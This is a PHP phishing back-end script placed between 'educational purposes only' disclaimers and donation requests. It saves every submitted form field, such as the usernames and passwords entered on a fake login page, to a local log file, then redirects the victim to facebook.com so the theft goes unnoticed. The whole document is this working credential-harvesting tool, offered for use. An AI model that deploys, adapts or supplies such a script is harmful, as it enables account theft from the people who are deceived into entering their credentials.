<!-- This source code or script for educational purposes ONLY. 

How you use this information is your responsibility.

I will not be held accountable for any illegel activities. -->


<!--                              𝐃𝐨𝐧𝐚𝐭𝐞 & 𝐒𝐮𝐩𝐩𝐨𝐫𝐭   

        Link -:  https://www.payumoney.com/paybypayumoney/#/B417AE12E63B634CFCA466275E2F17B5

        BTC  -:  3GRFNifUZJBii8nn8jcsYrCwHk3vA27gcd   

-->

<?php
 header('Location: https://www.facebook.com');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 	fwrite($handle, $variable);
 	fwrite($handle, "=");
 	fwrite($handle, $value);
 	fwrite($handle, "\r\n");
 }
   fwrite($handle, "\r\n");
   fclose($handle);
   exit;
?>

<!-- This source code or script for educational purposes ONLY. 

How you use this information is your responsibility.

I will not be held accountable for any illegel activities. -->